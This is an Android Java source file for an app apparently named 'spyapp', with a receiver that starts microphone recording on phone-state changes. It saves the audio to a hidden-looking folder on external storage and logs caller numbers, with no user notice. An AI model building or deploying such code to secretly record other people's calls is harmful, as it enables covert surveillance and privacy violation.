package com.example.vipul.spyapp10;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import android.util.Log;

import java.io.File;
import java.io.IOException;

public class MyPhoneReceiver extends BroadcastReceiver {
    MediaRecorder recorder;
    TelephonyManager telManager;
    boolean recordStarted;
    static boolean status = false;
    Time today;
    String phoneNumber;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.i("vipul1_action", "" + action);
        today = new Time(Time.getCurrentTimezone());
        today.setToNow();

        if (status == false) {
            try {
                recorder = new MediaRecorder();
                recorder.reset();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                String date = today.monthDay + "_" + (today.month + 1) + "_" + today.year;
                String time = today.format("%k_%M_%S");
                File file = createDirIfNotExists(date + "_" + time);
                recorder.setOutputFile(file.getAbsolutePath());
                recorder.prepare();
                recorder.start();
                recordStarted = true;
                status = true;
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            Bundle extras = intent.getExtras();
            if (extras != null) {
                // OFFHOOK
                String state = extras.getString(TelephonyManager.EXTRA_STATE);
                Log.w("DEBUG", "aa" + state);
                if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    phoneNumber = extras.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                    //  incoming(phoneNumber);
                    incomingcallrecord(action, context);
                } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                    Log.i("number >>>>>>>>>>>>>>", "" + this.getResultData());
                    incomingcallrecord(action, context);
                }
            }
        } else {
            status = false;
        }
    }

    private void incomingcallrecord(String action, Context context) {
        if (action.equals("android.intent.action.PHONE_STATE")) {
            telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
        }
    }

    private final PhoneStateListener phoneListener = new PhoneStateListener() {
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            Log.d("vipul1_call", "calling number" + incomingNumber);
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING: {
                        Log.e("vipul1_state", "CALL_STATE_RINGING");
                        break;
                    }
                    case TelephonyManager.CALL_STATE_OFFHOOK: {
                        Log.e("vipul1_state", "CALL_STATE_OFFHOOK");
                        break;
                    }
                    case TelephonyManager.CALL_STATE_IDLE: {
                        Log.e("vipul1_state", "CALL_STATE_IDLE");
                        if (recordStarted) {
                            recorder.stop();
                            recorder.reset();
                            recorder.release();
                            recorder = null;
                            recordStarted = false;
                            break;
                        }
                    }
                    default: {
                    }
                }
            } catch (Exception ex) {

            }
        }
    };

    public File createDirIfNotExists(String path) {
        File folder = new File(Environment.getExternalStorageDirectory() + "/PhoneCallRecording");
        if (!folder.exists()) {
            if (!folder.mkdirs()) {
                Log.e("vipul1_folder", "folder is created");
            }
        }
        File file = new File(folder, path + ".3GPP");
        try {
            if (!file.exists()) {
                if (file.createNewFile()) {
                    Log.e("vipul1_file", "file is created");
                }
            }
        } catch (IOException e) {
        }
        return file;
    }

}
